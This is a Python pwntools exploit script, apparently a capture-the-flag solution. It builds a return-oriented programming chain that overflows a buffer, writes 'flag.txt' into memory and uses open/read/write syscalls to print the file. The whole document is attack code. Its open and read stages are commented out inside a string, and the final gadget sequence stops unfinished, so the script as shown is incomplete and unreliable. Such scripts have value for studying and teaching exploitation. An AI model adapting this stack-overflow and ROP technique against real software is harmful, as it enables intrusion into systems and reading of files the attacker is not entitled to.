from pwn import *

context.log_level = 'info'

#Gadgets#
poprdi = 0x0000000000401766
poprsi = 0x000000000040778e
poprdx = 0x000000000043e075
poprax = 0x000000000043ebdc
syscall = 0x000000000040120f
movraxedx = 0x000000000045cdbe

#@#
BSS = 0x00000000004aa240
_flag = 0x67616c66
_txt = 0x7478742e
###Payload###
payload = ""
payload += cyclic(72)
payload += p64(poprdx)
payload += p64(_flag)
payload += p64(poprax)
payload += p64(BSS)
payload += p64(movraxedx)

payload += p64(poprdx)
payload += p64(_txt)
payload += p64(poprax)
payload += p64(BSS+4)
payload += p64(movraxedx)
"""
#Open flag file#
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(0x2)
payload += p64(syscall)

#read flag file content#
payload += cyclic(1000)
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(0x0)
payload += p64(syscall)
"""
#write flag#
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(BSS)
payload += p64(poprdx)
payload += p64(0x10)
payload += p64(poprax)
payload += p64(0x1)
payload += p64(syscall)
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
print payload